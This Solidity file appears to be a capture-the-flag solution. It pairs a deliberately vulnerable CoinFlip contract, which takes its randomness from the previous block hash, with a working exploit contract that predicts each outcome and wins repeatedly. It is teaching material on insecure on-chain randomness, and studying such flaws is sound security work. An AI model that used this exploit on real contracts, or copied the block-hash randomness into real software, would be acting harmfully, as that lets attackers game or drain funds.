pragma solidity ^0.4.18;
contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

//Exploits the fact that the "randomness" of the contract above is determined by publicly available variables
//  Uses those variables to determine the output of the "random" calculation
//  Call exploit() 10 times to solve the level

contract CoinFlipExploit {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    CoinFlip public coinFlipContractInst;
    function findTheContractToExploit() public {
        //Place address of CoinFlip contract instance in CoinFlip( HERE )
        coinFlipContractInst = CoinFlip(0xB3dDc077535e39C3B6684dA4217Cf235e27645f1);
    }
    
    function exploit() public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        bool result = coinFlipContractInst.flip(side);
        
        return true;
    }
}
